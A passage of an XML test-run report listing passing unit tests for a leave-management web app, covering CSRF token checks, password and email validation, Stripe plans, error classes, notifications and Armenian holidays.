    <testcase classname="exchangeCodeForTokens throws on Google exchange failure" name="exchangeCodeForTokens throws on Google exchange failure" time="0.002">
    </testcase>
  </testsuite>
  <testsuite name="STRIPE_PLANS" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:59" time="1.25" tests="15">
    <testcase classname="STRIPE_PLANS has all 3 plan tiers" name="STRIPE_PLANS has all 3 plan tiers" time="0.004">
    </testcase>
    <testcase classname="STRIPE_PLANS all plans have priceIdEnv" name="STRIPE_PLANS all plans have priceIdEnv" time="0.002">
    </testcase>
    <testcase classname="STRIPE_PLANS is a const object (as const)" name="STRIPE_PLANS is a const object (as const)" time="0.004">
    </testcase>
    <testcase classname="resolvePlanFromPriceId returns starter for matching price ID" name="resolvePlanFromPriceId returns starter for matching price ID" time="0.004">
    </testcase>
    <testcase classname="resolvePlanFromPriceId returns professional for matching price ID" name="resolvePlanFromPriceId returns professional for matching price ID" time="0.001">
    </testcase>
    <testcase classname="resolvePlanFromPriceId returns enterprise for matching price ID" name="resolvePlanFromPriceId returns enterprise for matching price ID" time="0.001">
    </testcase>
    <testcase classname="resolvePlanFromPriceId returns null for unknown price ID" name="resolvePlanFromPriceId returns null for unknown price ID" time="0.003">
    </testcase>
    <testcase classname="resolvePlanFromPriceId returns null when env vars are not set" name="resolvePlanFromPriceId returns null when env vars are not set" time="0.001">
    </testcase>
    <testcase classname="isValidEmail accepts valid email" name="isValidEmail accepts valid email" time="0.001">
    </testcase>
    <testcase classname="isValidEmail rejects missing @" name="isValidEmail rejects missing @" time="0">
    </testcase>
    <testcase classname="isValidEmail rejects missing domain" name="isValidEmail rejects missing domain" time="0">
    </testcase>
    <testcase classname="isValidEmail rejects missing TLD" name="isValidEmail rejects missing TLD" time="0">
    </testcase>
    <testcase classname="isValidEmail rejects empty string" name="isValidEmail rejects empty string" time="0.001">
    </testcase>
    <testcase classname="isValidEmail rejects spaces" name="isValidEmail rejects spaces" time="0.001">
    </testcase>
    <testcase classname="isValidEmail accepts subdomain email" name="isValidEmail accepts subdomain email" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="Error Classes" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:59" time="1.372" tests="32">
    <testcase classname="Error Classes AppError creates error with message and code" name="Error Classes AppError creates error with message and code" time="0.002">
    </testcase>
    <testcase classname="Error Classes AppError creates error with custom status code" name="Error Classes AppError creates error with custom status code" time="0">
    </testcase>
    <testcase classname="Error Classes UserError creates user-friendly error" name="Error Classes UserError creates user-friendly error" time="0.002">
    </testcase>
    <testcase classname="Error Classes AuthError creates authentication error" name="Error Classes AuthError creates authentication error" time="0.002">
    </testcase>
    <testcase classname="Error Classes PermissionError creates permission error" name="Error Classes PermissionError creates permission error" time="0.002">
    </testcase>
    <testcase classname="Error Classes NotFoundError creates not found error" name="Error Classes NotFoundError creates not found error" time="0.001">
    </testcase>
    <testcase classname="Error Classes NetworkError creates network error" name="Error Classes NetworkError creates network error" time="0.002">
    </testcase>
    <testcase classname="Error Classes ServerError creates server error" name="Error Classes ServerError creates server error" time="0.001">
    </testcase>
    <testcase classname="Error Classes ValidationError creates validation error with details" name="Error Classes ValidationError creates validation error with details" time="0.001">
    </testcase>
    <testcase classname="getErrorMessage extracts message from Error instance" name="getErrorMessage extracts message from Error instance" time="0.001">
    </testcase>
    <testcase classname="getErrorMessage returns string input as-is" name="getErrorMessage returns string input as-is" time="0">
    </testcase>
    <testcase classname="getErrorMessage returns fallback for unknown types" name="getErrorMessage returns fallback for unknown types" time="0.004">
    </testcase>
    <testcase classname="getErrorCode returns code from AppError" name="getErrorCode returns code from AppError" time="0.001">
    </testcase>
    <testcase classname="getErrorCode returns UNKNOWN_ERROR for regular Error" name="getErrorCode returns UNKNOWN_ERROR for regular Error" time="0.001">
    </testcase>
    <testcase classname="getErrorCode returns UNKNOWN_ERROR for non-Error" name="getErrorCode returns UNKNOWN_ERROR for non-Error" time="0.001">
    </testcase>
    <testcase classname="getErrorStatusCode returns status from AppError" name="getErrorStatusCode returns status from AppError" time="0.001">
    </testcase>
    <testcase classname="getErrorStatusCode returns undefined for regular Error" name="getErrorStatusCode returns undefined for regular Error" time="0">
    </testcase>
    <testcase classname="toAppError returns AppError as-is" name="toAppError returns AppError as-is" time="0.001">
    </testcase>
    <testcase classname="toAppError converts string to AppError" name="toAppError converts string to AppError" time="0.001">
    </testcase>
    <testcase classname="toAppError converts Error to AppError with message" name="toAppError converts Error to AppError with message" time="0">
    </testcase>
    <testcase classname="toAppError creates AuthError for unauthorized messages" name="toAppError creates AuthError for unauthorized messages" time="0.001">
    </testcase>
    <testcase classname="toAppError creates PermissionError for permission messages" name="toAppError creates PermissionError for permission messages" time="0.001">
    </testcase>
    <testcase classname="toAppError creates NetworkError for network messages" name="toAppError creates NetworkError for network messages" time="0.001">
    </testcase>
    <testcase classname="toAppError creates ServerError for unknown errors" name="toAppError creates ServerError for unknown errors" time="0.001">
    </testcase>
    <testcase classname="Type Guards isError returns true for Error instances" name="Type Guards isError returns true for Error instances" time="0">
    </testcase>
    <testcase classname="Type Guards isError returns false for non-Errors" name="Type Guards isError returns false for non-Errors" time="0.001">
    </testcase>
    <testcase classname="Type Guards isAppError returns true for AppError instances" name="Type Guards isAppError returns true for AppError instances" time="0.001">
    </testcase>
    <testcase classname="Type Guards isAppError returns false for regular Error" name="Type Guards isAppError returns false for regular Error" time="0">
    </testcase>
    <testcase classname="Type Guards isUserError returns true for UserError" name="Type Guards isUserError returns true for UserError" time="0">
    </testcase>
    <testcase classname="Type Guards isUserError returns false for other errors" name="Type Guards isUserError returns false for other errors" time="0.001">
    </testcase>
    <testcase classname="Type Guards isAuthError returns true for AuthError" name="Type Guards isAuthError returns true for AuthError" time="0.001">
    </testcase>
    <testcase classname="Type Guards isNetworkError returns true for NetworkError" name="Type Guards isNetworkError returns true for NetworkError" time="0.003">
    </testcase>
  </testsuite>
  <testsuite name="playNotificationSound" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:59" time="1.411" tests="18">
    <testcase classname="playNotificationSound does not throw when called with new_request type" name="playNotificationSound does not throw when called with new_request type" time="0.007">
    </testcase>
    <testcase classname="playNotificationSound does not throw when called with approved type" name="playNotificationSound does not throw when called with approved type" time="0.004">
    </testcase>
    <testcase classname="playNotificationSound does not throw when called with rejected type" name="playNotificationSound does not throw when called with rejected type" time="0.002">
    </testcase>
    <testcase classname="playNotificationSound returns undefined for all types" name="playNotificationSound returns undefined for all types" time="0.005">
    </testcase>
    <testcase classname="playNotificationSound silently catches AudioContext construction errors and warns" name="playNotificationSound silently catches AudioContext construction errors and warns" time="0.003">
    </testcase>
    <testcase classname="playNotificationSound plays new_request, approved, and rejected without error" name="playNotificationSound plays new_request, approved, and rejected without error" time="0.011">
    </testcase>
    <testcase classname="playChatMessageSound does not throw when called" name="playChatMessageSound does not throw when called" time="0.008">
    </testcase>
    <testcase classname="playChatMessageSound returns undefined" name="playChatMessageSound returns undefined" time="0.002">
    </testcase>
    <testcase classname="playChatMessageSound catches errors and warns" name="playChatMessageSound catches errors and warns" time="0.002">
    </testcase>
    <testcase classname="requestNotificationPermission returns true when permission is already granted" name="requestNotificationPermission returns true when permission is already granted" time="0.003">
    </testcase>
    <testcase classname="requestNotificationPermission returns false and requests permission when permission is default (not granted/denied)" name="requestNotificationPermission returns false and requests permission when permission is default (not granted/denied)" time="0.001">
    </testcase>
    <testcase classname="requestNotificationPermission returns false when permission is denied" name="requestNotificationPermission returns false when permission is denied" time="0.001">
    </testcase>
    <testcase classname="requestNotificationPermission returns false when Notification API is not available" name="requestNotificationPermission returns false when Notification API is not available" time="0.001">
    </testcase>
    <testcase classname="sendBrowserNotification does not throw with minimal args" name="sendBrowserNotification does not throw with minimal args" time="0.105">
    </testcase>
    <testcase classname="sendBrowserNotification does not throw with soundType option" name="sendBrowserNotification does not throw with soundType option" time="0.004">
    </testcase>
    <testcase classname="sendBrowserNotification does not throw with rejected sound type" name="sendBrowserNotification does not throw with rejected sound type" time="0.005">
    </testcase>
    <testcase classname="sendBrowserNotification does not send browser notification when permission is not granted" name="sendBrowserNotification does not send browser notification when permission is not granted" time="0.003">
    </testcase>
    <testcase classname="sendBrowserNotification does not send when Notification API is absent" name="sendBrowserNotification does not send when Notification API is absent" time="0.002">
    </testcase>
  </testsuite>
  <testsuite name="isArmenianHoliday" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:00" time="1.015" tests="28">
    <testcase classname="isArmenianHoliday returns true for New Year (January 1)" name="isArmenianHoliday returns true for New Year (January 1)" time="0.002">
    </testcase>
    <testcase classname="isArmenianHoliday returns true for Christmas (January 6)" name="isArmenianHoliday returns true for Christmas (January 6)" time="0.001">
    </testcase>
    <testcase classname="isArmenianHoliday returns true for Womens Day (March 8)" name="isArmenianHoliday returns true for Womens Day (March 8)" time="0.001">
    </testcase>
    <testcase classname="isArmenianHoliday returns true for Republic Day (May 28)" name="isArmenianHoliday returns true for Republic Day (May 28)" time="0.001">
    </testcase>
    <testcase classname="isArmenianHoliday returns true for Independence Day (September 21)" name="isArmenianHoliday returns true for Independence Day (September 21)" time="0.001">
    </testcase>
    <testcase classname="isArmenianHoliday returns false for regular day" name="isArmenianHoliday returns false for regular day" time="0.001">
    </testcase>
    <testcase classname="isArmenianHoliday handles Date objects" name="isArmenianHoliday handles Date objects" time="0.001">
    </testcase>
    <testcase classname="getArmenianHoliday returns holiday object for valid date" name="getArmenianHoliday returns holiday object for valid date" time="0.002">
    </testcase>
    <testcase classname="getArmenianHoliday returns null for non-holiday" name="getArmenianHoliday returns null for non-holiday" time="0.001">
    </testcase>
    <testcase classname="getArmenianHoliday returns correct holiday for Christmas" name="getArmenianHoliday returns correct holiday for Christmas" time="0.001">
    </testcase>
    <testcase classname="getArmenianHolidaysByYear returns all holidays for a given year" name="getArmenianHolidaysByYear returns all holidays for a given year" time="0.005">
    </testcase>
    <testcase classname="getArmenianHolidaysByYear returns empty array for year with no holidays" name="getArmenianHolidaysByYear returns empty array for year with no holidays" time="0.002">
    </testcase>
    <testcase classname="getArmenianHolidaysByYear returns correct number of fixed holidays" name="getArmenianHolidaysByYear returns correct number of fixed holidays" time="0.001">
    </testcase>
    <testcase classname="getUpcomingArmenianHolidays returns future holidays within default 90 days" name="getUpcomingArmenianHolidays returns future holidays within default 90 days" time="0.001">
    </testcase>
    <testcase classname="getUpcomingArmenianHolidays returns only holidays with future dates" name="getUpcomingArmenianHolidays returns only holidays with future dates" time="0.005">
    </testcase>
    <testcase classname="getUpcomingArmenianHolidays accepts custom days ahead parameter" name="getUpcomingArmenianHolidays accepts custom days ahead parameter" time="0.001">
    </testcase>
    <testcase classname="allArmenianHolidays contains combined holidays from both years" name="allArmenianHolidays contains combined holidays from both years" time="0.006">
    </testcase>
    <testcase classname="allArmenianHolidays total count equals sum of both years" name="allArmenianHolidays total count equals sum of both years" time="0.001">
    </testcase>
    <testcase classname="allArmenianHolidays every holiday has required fields" name="allArmenianHolidays every holiday has required fields" time="0.056">
    </testcase>
    <testcase classname="allArmenianHolidays all holidays are national" name="allArmenianHolidays all holidays are national" time="0.005">
    </testcase>
    <testcase classname="allArmenianHolidays has no duplicate dates" name="allArmenianHolidays has no duplicate dates" time="0">
    </testcase>
    <testcase classname="armenianHolidays2026 has correct number of holidays" name="armenianHolidays2026 has correct number of holidays" time="0">
    </testcase>
    <testcase classname="armenianHolidays2026 starts with New Year on Jan 1" name="armenianHolidays2026 starts with New Year on Jan 1" time="0.001">
    </testcase>
    <testcase classname="armenianHolidays2026 ends with New Year Eve on Dec 31" name="armenianHolidays2026 ends with New Year Eve on Dec 31" time="0.001">
    </testcase>
    <testcase classname="armenianHolidays2026 dates are in ascending order" name="armenianHolidays2026 dates are in ascending order" time="0.003">
    </testcase>
    <testcase classname="armenianHolidays2027 has same number of holidays as 2026" name="armenianHolidays2027 has same number of holidays as 2026" time="0.001">
    </testcase>
    <testcase classname="armenianHolidays2027 has dates in 2027" name="armenianHolidays2027 has dates in 2027" time="0.005">
    </testcase>
    <testcase classname="armenianHolidays2027 has the same holiday names as 2026" name="armenianHolidays2027 has the same holiday names as 2026" time="0.002">
    </testcase>
  </testsuite>
  <testsuite name="CSRF constants" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:00" time="1.173" tests="73">
    <testcase classname="CSRF constants defines CSRF_TOKEN_NAME" name="CSRF constants defines CSRF_TOKEN_NAME" time="0.002">
    </testcase>
    <testcase classname="CSRF constants defines CSRF_SIGNATURE_NAME" name="CSRF constants defines CSRF_SIGNATURE_NAME" time="0">
    </testcase>
    <testcase classname="CSRF constants defines CSRF_COOKIE_NAME" name="CSRF constants defines CSRF_COOKIE_NAME" time="0.001">
    </testcase>
    <testcase classname="CSRF constants defines CSRF_PROTECTED_METHODS" name="CSRF constants defines CSRF_PROTECTED_METHODS" time="0.001">
    </testcase>
    <testcase classname="generateCsrfToken generates a hex string" name="generateCsrfToken generates a hex string" time="0.002">
    </testcase>
    <testcase classname="generateCsrfToken generates a 64-character token (32 bytes hex)" name="generateCsrfToken generates a 64-character token (32 bytes hex)" time="0.001">
    </testcase>
    <testcase classname="generateCsrfToken generates unique tokens on each call" name="generateCsrfToken generates unique tokens on each call" time="0.001">
    </testcase>
    <testcase classname="createCsrfToken returns an object with token and signature" name="createCsrfToken returns an object with token and signature" time="0.003">
    </testcase>
    <testcase classname="createCsrfToken generates a valid token hex string" name="createCsrfToken generates a valid token hex string" time="0.001">
    </testcase>
    <testcase classname="createCsrfToken generates a valid signature hex string" name="createCsrfToken generates a valid signature hex string" time="0">
    </testcase>
    <testcase classname="createCsrfToken generates different signatures for different tokens" name="createCsrfToken generates different signatures for different tokens" time="0.001">
    </testcase>
    <testcase classname="verifyCsrfToken returns true for valid token-signature pair" name="verifyCsrfToken returns true for valid token-signature pair" time="0.002">
    </testcase>
    <testcase classname="verifyCsrfToken returns false for tampered token" name="verifyCsrfToken returns false for tampered token" time="0.007">
    </testcase>
    <testcase classname="verifyCsrfToken returns false for tampered signature" name="verifyCsrfToken returns false for tampered signature" time="0.001">
    </testcase>
    <testcase classname="verifyCsrfToken returns false for different token-signature pairs" name="verifyCsrfToken returns false for different token-signature pairs" time="0.001">
    </testcase>
    <testcase classname="verifyCsrfToken returns false when signature has different length" name="verifyCsrfToken returns false when signature has different length" time="0.001">
    </testcase>
    <testcase classname="verifyCsrfToken returns false for empty token" name="verifyCsrfToken returns false for empty token" time="0.001">
    </testcase>
    <testcase classname="verifyCsrfToken returns false for empty signature" name="verifyCsrfToken returns false for empty signature" time="0">
    </testcase>
    <testcase classname="verifyCsrfFromRequest returns true for valid request headers" name="verifyCsrfFromRequest returns true for valid request headers" time="0.001">
    </testcase>
    <testcase classname="verifyCsrfFromRequest returns false when token header missing" name="verifyCsrfFromRequest returns false when token header missing" time="0">
    </testcase>
    <testcase classname="verifyCsrfFromRequest returns false when signature header missing" name="verifyCsrfFromRequest returns false when signature header missing" time="0.001">
    </testcase>
    <testcase classname="verifyCsrfFromRequest returns false for invalid token-signature" name="verifyCsrfFromRequest returns false for invalid token-signature" time="0.001">
    </testcase>
    <testcase classname="verifyCsrfFromRequest returns false when signature length mismatches" name="verifyCsrfFromRequest returns false when signature length mismatches" time="0.001">
    </testcase>
    <testcase classname="requiresCsrfProtection returns true for POST" name="requiresCsrfProtection returns true for POST" time="0">
    </testcase>
    <testcase classname="requiresCsrfProtection returns true for PUT" name="requiresCsrfProtection returns true for PUT" time="0.001">
    </testcase>
    <testcase classname="requiresCsrfProtection returns true for DELETE" name="requiresCsrfProtection returns true for DELETE" time="0.001">
    </testcase>
    <testcase classname="requiresCsrfProtection returns true for PATCH" name="requiresCsrfProtection returns true for PATCH" time="0.003">
    </testcase>
    <testcase classname="requiresCsrfProtection returns false for GET" name="requiresCsrfProtection returns false for GET" time="0.001">
    </testcase>
    <testcase classname="requiresCsrfProtection returns false for HEAD" name="requiresCsrfProtection returns false for HEAD" time="0.001">
    </testcase>
    <testcase classname="requiresCsrfProtection returns false for OPTIONS" name="requiresCsrfProtection returns false for OPTIONS" time="0.001">
    </testcase>
    <testcase classname="requiresCsrfProtection is case-insensitive" name="requiresCsrfProtection is case-insensitive" time="0.002">
    </testcase>
    <testcase classname="requiresCsrfProtection returns false for empty string" name="requiresCsrfProtection returns false for empty string" time="0">
    </testcase>
    <testcase classname="requiresCsrfProtection covers exactly the 4 methods in CSRF_PROTECTED_METHODS" name="requiresCsrfProtection covers exactly the 4 methods in CSRF_PROTECTED_METHODS" time="0.002">
    </testcase>
    <testcase classname="generateCsrfToken - parameterized generates 64 char hex strings" name="generateCsrfToken - parameterized generates 64 char hex strings" time="0.004">
    </testcase>
    <testcase classname="generateCsrfToken - parameterized all 20 generated tokens are unique" name="generateCsrfToken - parameterized all 20 generated tokens are unique" time="0.002">
    </testcase>
    <testcase classname="createCsrfToken - parameterized all pairs have different tokens and signatures" name="createCsrfToken - parameterized all pairs have different tokens and signatures" time="0.002">
    </testcase>
    <testcase classname="createCsrfToken - parameterized token and signature are different for each pair" name="createCsrfToken - parameterized token and signature are different for each pair" time="0.001">
    </testcase>
    <testcase classname="createCsrfToken - parameterized token is 64 hex chars" name="createCsrfToken - parameterized token is 64 hex chars" time="0.001">
    </testcase>
    <testcase classname="createCsrfToken - parameterized signature is 64 hex chars" name="createCsrfToken - parameterized signature is 64 hex chars" time="0.001">
    </testcase>
    <testcase classname="verifyCsrfToken - aggressive validation verifies its own token" name="verifyCsrfToken - aggressive validation verifies its own token" time="0.004">
    </testcase>
    <testcase classname="verifyCsrfToken - aggressive validation rejects cross-pair verification" name="verifyCsrfToken - aggressive validation rejects cross-pair verification" time="0.027">
    </testcase>
    <testcase classname="verifyCsrfToken - aggressive validation rejects empty strings" name="verifyCsrfToken - aggressive validation rejects empty strings" time="0.002">
    </testcase>
    <testcase classname="verifyCsrfToken - aggressive validation rejects wrong length signature" name="verifyCsrfToken - aggressive validation rejects wrong length signature" time="0.001">
    </testcase>
    <testcase classname="verifyCsrfToken - aggressive validation rejects malformed tokens" name="verifyCsrfToken - aggressive validation rejects malformed tokens" time="0.01">
    </testcase>
    <testcase classname="requiresCsrfProtection - all methods protects POST" name="requiresCsrfProtection - all methods protects POST" time="0">
    </testcase>
    <testcase classname="requiresCsrfProtection - all methods protects PUT" name="requiresCsrfProtection - all methods protects PUT" time="0">
    </testcase>
    <testcase classname="requiresCsrfProtection - all methods protects DELETE" name="requiresCsrfProtection - all methods protects DELETE" time="0.001">
    </testcase>
    <testcase classname="requiresCsrfProtection - all methods protects PATCH" name="requiresCsrfProtection - all methods protects PATCH" time="0.001">
    </testcase>
    <testcase classname="requiresCsrfProtection - all methods protects lowercase POST" name="requiresCsrfProtection - all methods protects lowercase POST" time="0.001">
    </testcase>
    <testcase classname="requiresCsrfProtection - all methods protects lowercase PUT" name="requiresCsrfProtection - all methods protects lowercase PUT" time="0">
    </testcase>
    <testcase classname="requiresCsrfProtection - all methods protects lowercase DELETE" name="requiresCsrfProtection - all methods protects lowercase DELETE" time="0.001">
    </testcase>
    <testcase classname="requiresCsrfProtection - all methods protects lowercase PATCH" name="requiresCsrfProtection - all methods protects lowercase PATCH" time="0">
    </testcase>
    <testcase classname="requiresCsrfProtection - all methods does not protect GET" name="requiresCsrfProtection - all methods does not protect GET" time="0.001">
    </testcase>
    <testcase classname="requiresCsrfProtection - all methods does not protect HEAD" name="requiresCsrfProtection - all methods does not protect HEAD" time="0.001">
    </testcase>
    <testcase classname="requiresCsrfProtection - all methods does not protect OPTIONS" name="requiresCsrfProtection - all methods does not protect OPTIONS" time="0.001">
    </testcase>
    <testcase classname="requiresCsrfProtection - all methods does not protect TRACE" name="requiresCsrfProtection - all methods does not protect TRACE" time="0">
    </testcase>
    <testcase classname="requiresCsrfProtection - all methods does not protect CONNECT" name="requiresCsrfProtection - all methods does not protect CONNECT" time="0.001">
    </testcase>
    <testcase classname="verifyCsrfToken - massive validation 10 pairs all self-verify" name="verifyCsrfToken - massive validation 10 pairs all self-verify" time="0.004">
    </testcase>
    <testcase classname="verifyCsrfToken - massive validation cross-verify all pairs fail" name="verifyCsrfToken - massive validation cross-verify all pairs fail" time="0.018">
    </testcase>
    <testcase classname="verifyCsrfToken - massive validation rejects invalid signature length: " name="verifyCsrfToken - massive validation rejects invalid signature length: " time="0">
    </testcase>
    <testcase classname="verifyCsrfToken - massive validation rejects invalid signature length: short" name="verifyCsrfToken - massive validation rejects invalid signature length: short" time="0">
    </testcase>
    <testcase classname="verifyCsrfToken - massive validation rejects invalid signature length: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" name="verifyCsrfToken - massive validation rejects invalid signature length: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" time="0.001">
    </testcase>
    <testcase classname="verifyCsrfToken - massive validation rejects invalid signature length: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" name="verifyCsrfToken - massive validation rejects invalid signature length: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" time="0">
    </testcase>
    <testcase classname="verifyCsrfToken - massive validation rejects invalid signature length: xxx" name="verifyCsrfToken - massive validation rejects invalid signature length: xxx" time="0.001">
    </testcase>
    <testcase classname="verifyCsrfToken - massive validation rejects invalid token: " name="verifyCsrfToken - massive validation rejects invalid token: " time="0.001">
    </testcase>
    <testcase classname="verifyCsrfToken - massive validation rejects invalid token: short" name="verifyCsrfToken - massive validation rejects invalid token: short" time="0.001">
    </testcase>
    <testcase classname="verifyCsrfToken - massive validation rejects invalid token: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" name="verifyCsrfToken - massive validation rejects invalid token: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" time="0.001">
    </testcase>
    <testcase classname="verifyCsrfToken - massive validation rejects invalid token: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" name="verifyCsrfToken - massive validation rejects invalid token: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" time="0.001">
    </testcase>
    <testcase classname="verifyCsrfToken - massive validation rejects invalid token: xxx" name="verifyCsrfToken - massive validation rejects invalid token: xxx" time="0.001">
    </testcase>
    <testcase classname="verifyCsrfFromRequest - expanded rejects bad request: missing token header" name="verifyCsrfFromRequest - expanded rejects bad request: missing token header" time="0.001">
    </testcase>
    <testcase classname="verifyCsrfFromRequest - expanded rejects bad request: missing sig header" name="verifyCsrfFromRequest - expanded rejects bad request: missing sig header" time="0">
    </testcase>
    <testcase classname="verifyCsrfFromRequest - expanded rejects bad request: both missing" name="verifyCsrfFromRequest - expanded rejects bad request: both missing" time="0">
    </testcase>
    <testcase classname="verifyCsrfFromRequest - expanded rejects bad request: wrong token and sig" name="verifyCsrfFromRequest - expanded rejects bad request: wrong token and sig" time="0">
    </testcase>
  </testsuite>
  <testsuite name="leaveSettings.createHoliday" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:00" time="0.987" tests="21">
    <testcase classname="leaveSettings.createHoliday rejects unauthenticated caller" name="leaveSettings.createHoliday rejects unauthenticated caller" time="0.047">
    </testcase>
    <testcase classname="leaveSettings.createHoliday rejects admin from other org" name="leaveSettings.createHoliday rejects admin from other org" time="0.001">
    </testcase>
    <testcase classname="leaveSettings.createHoliday rejects employee caller" name="leaveSettings.createHoliday rejects employee caller" time="0.001">
    </testcase>
    <testcase classname="leaveSettings.createHoliday rejects empty name" name="leaveSettings.createHoliday rejects empty name" time="0.002">
    </testcase>
    <testcase classname="leaveSettings.createHoliday rejects empty date" name="leaveSettings.createHoliday rejects empty date" time="0.002">
    </testcase>
    <testcase classname="leaveSettings.createHoliday creates holiday for same-org admin" name="leaveSettings.createHoliday creates holiday for same-org admin" time="0.002">
    </testcase>
    <testcase classname="leaveSettings.createHoliday allows superadmin from any org" name="leaveSettings.createHoliday allows superadmin from any org" time="0.001">
    </testcase>
    <testcase classname="leaveSettings.deleteHoliday rejects unauthenticated" name="leaveSettings.deleteHoliday rejects unauthenticated" time="0.001">
    </testcase>
    <testcase classname="leaveSettings.deleteHoliday silently returns when holiday not found" name="leaveSettings.deleteHoliday silently returns when holiday not found" time="0.001">
    </testcase>
    <testcase classname="leaveSettings.deleteHoliday rejects admin from other org" name="leaveSettings.deleteHoliday rejects admin from other org" time="0.001">
    </testcase>
    <testcase classname="leaveSettings.deleteHoliday deletes and logs audit for same-org admin" name="leaveSettings.deleteHoliday deletes and logs audit for same-org admin" time="0.002">
    </testcase>
    <testcase classname="leaveSettings.deleteHoliday allows superadmin" name="leaveSettings.deleteHoliday allows superadmin" time="0.002">
    </testcase>
    <testcase classname="leaveSettings.getHolidays returns empty when caller is null" name="leaveSettings.getHolidays returns empty when caller is null" time="0.002">
    </testcase>
    <testcase classname="leaveSettings.getHolidays returns holidays for same-org caller" name="leaveSettings.getHolidays returns holidays for same-org caller" time="0.001">
    </testcase>
    <testcase classname="leaveSettings.getHolidays returns empty for cross-org caller" name="leaveSettings.getHolidays returns empty for cross-org caller" time="0.001">
    </testcase>
    <testcase classname="leaveSettings.getEmployeeLeaveBalances returns empty when caller is null" name="leaveSettings.getEmployeeLeaveBalances returns empty when caller is null" time="0.001">
    </testcase>
    <testcase classname="leaveSettings.getEmployeeLeaveBalances returns empty for cross-org caller" name="leaveSettings.getEmployeeLeaveBalances returns empty for cross-org caller" time="0.001">
    </testcase>
    <testcase classname="leaveSettings.getEmployeeLeaveBalances returns enriched employees for same-org caller" name="leaveSettings.getEmployeeLeaveBalances returns enriched employees for same-org caller" time="0.002">
    </testcase>
    <testcase classname="leaveSettings.updateLeaveBalance rejects unauthenticated" name="leaveSettings.updateLeaveBalance rejects unauthenticated" time="0.002">
    </testcase>
    <testcase classname="leaveSettings.updateLeaveBalance rejects admin from other org" name="leaveSettings.updateLeaveBalance rejects admin from other org" time="0.002">
    </testcase>
    <testcase classname="leaveSettings.updateLeaveBalance updates balance for same-org admin" name="leaveSettings.updateLeaveBalance updates balance for same-org admin" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="useSubscription" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:58" time="3.592" tests="6">
    <testcase classname="useSubscription returns loading state when query is undefined" name="useSubscription returns loading state when query is undefined" time="0.004">
    </testcase>
    <testcase classname="useSubscription returns active state with starter plan" name="useSubscription returns active state with starter plan" time="0.002">
    </testcase>
    <testcase classname="useSubscription returns active state with professional plan" name="useSubscription returns active state with professional plan" time="0.001">
    </testcase>
    <testcase classname="useSubscription returns active state with enterprise plan" name="useSubscription returns active state with enterprise plan" time="0.001">
    </testcase>
    <testcase classname="useSubscription falls back to starter when organization has no plan field" name="useSubscription falls back to starter when organization has no plan field" time="0.001">
    </testcase>
    <testcase classname="useSubscription falls back to starter when organization is null" name="useSubscription falls back to starter when organization is null" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="validatePassword" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:00" time="1.021" tests="42">
    <testcase classname="validatePassword returns score 0 for empty string" name="validatePassword returns score 0 for empty string" time="0.006">
    </testcase>
    <testcase classname="validatePassword penalizes all-numeric passwords" name="validatePassword penalizes all-numeric passwords" time="0.002">
    </testcase>
    <testcase classname="validatePassword penalizes all-letter passwords" name="validatePassword penalizes all-letter passwords" time="0.001">
    </testcase>
    <testcase classname="validatePassword penalizes common passwords" name="validatePassword penalizes common passwords" time="0.001">
    </testcase>
    <testcase classname="validatePassword detects repeated characters" name="validatePassword detects repeated characters" time="0.001">
    </testcase>
    <testcase classname="validatePassword gives bonus for Cyrillic characters" name="validatePassword gives bonus for Cyrillic characters" time="0.002">
    </testcase>
    <testcase classname="validatePassword gives bonus for 16+ character passwords" name="validatePassword gives bonus for 16+ character passwords" time="0.002">
    </testcase>
    <testcase classname="validatePassword returns excellent for strong password" name="validatePassword returns excellent for strong password" time="0.001">
    </testcase>
    <testcase classname="validatePassword clamps score to 0-100 range" name="validatePassword clamps score to 0-100 range" time="0.001">
    </testcase>
    <testcase classname="validatePassword deduplicates suggestions" name="validatePassword deduplicates suggestions" time="0">
    </testcase>
    <testcase classname="validateEmail returns valid for correct email" name="validateEmail returns valid for correct email" time="0.002">
    </testcase>
    <testcase classname="validateEmail detects gmail typo" name="validateEmail detects gmail typo" time="0.001">
    </testcase>
    <testcase classname="validateEmail detects yahoo typo" name="validateEmail detects yahoo typo" time="0.001">
    </testcase>
    <testcase classname="validateEmail rejects invalid format" name="validateEmail rejects invalid format" time="0.001">
    </testcase>
    <testcase classname="validateEmail rejects empty string" name="validateEmail rejects empty string" time="0.001">
    </testcase>
    <testcase classname="getStrengthColor returns red for weak" name="getStrengthColor returns red for weak" time="0.001">
    </testcase>
    <testcase classname="getStrengthColor returns orange for fair" name="getStrengthColor returns orange for fair" time="0.001">
    </testcase>
    <testcase classname="getStrengthColor returns yellow for good" name="getStrengthColor returns yellow for good" time="0.001">
    </testcase>
    <testcase classname="getStrengthColor returns light green for strong" name="getStrengthColor returns light green for strong" time="0.001">
    </testcase>
    <testcase classname="getStrengthColor returns green for excellent" name="getStrengthColor returns green for excellent" time="0.008">
    </testcase>
    <testcase classname="getStrengthColor returns gray for unknown strength" name="getStrengthColor returns gray for unknown strength" time="0.001">
    </testcase>
